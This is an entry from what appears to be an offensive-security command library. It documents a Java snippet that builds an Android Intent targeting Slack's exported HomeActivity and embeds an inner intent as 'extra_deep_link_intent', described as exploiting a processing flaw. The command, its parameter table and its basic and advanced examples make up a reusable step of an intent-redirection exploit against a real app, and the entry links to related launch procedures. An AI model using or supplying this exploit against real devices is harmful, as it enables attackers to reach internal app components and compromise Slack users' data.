---
id: cmd-embed-intent-homeactivity
data: >-
  Intent start = new Intent();
  start.setClassName("com.Slack","com.Slack.ui.HomeActivity");
  start.putExtra("extra_deep_link_intent", next);
tags:
  - intent-embedding
type: command
output: null
executor: java
platforms:
  - Android
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:44.589Z'
verified: false
validated: true
submitted: true
---
# embed-intent-in-homeactivity

## Command

```java
Intent start = new Intent(); start.setClassName("com.Slack","com.Slack.ui.HomeActivity"); start.putExtra("extra_deep_link_intent", next);
```

## Description

Embeds an inner intent (next) into an outer intent for Slack's exported HomeActivity as 'extra_deep_link_intent', exploiting the processing flaw.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| setClassName("com.Slack","com.Slack.ui.HomeActivity") | Targets exported activity | Yes |
| putExtra("extra_deep_link_intent", next) | Embeds inner intent | Yes |

## Examples

### Basic Usage

```java
Intent start = new Intent(); start.setClassName("com.Slack","com.Slack.ui.HomeActivity"); start.putExtra("extra_deep_link_intent", innerIntent);
```

### Advanced Usage

```java
Intent start = new Intent(); start.setClassName("com.Slack","com.Slack.ui.HomeActivity"); start.putExtra("extra_deep_link_intent", webviewIntent); // webviewIntent from previous
```

## Expected Output

Outer Intent with embedded payload, ready for startActivity to trigger HomeActivity processing.

## Related

- [[commands/start-activity-exploit]]
- [[procedures/Embed-Intent-into-HomeActivity-and-Launch]]
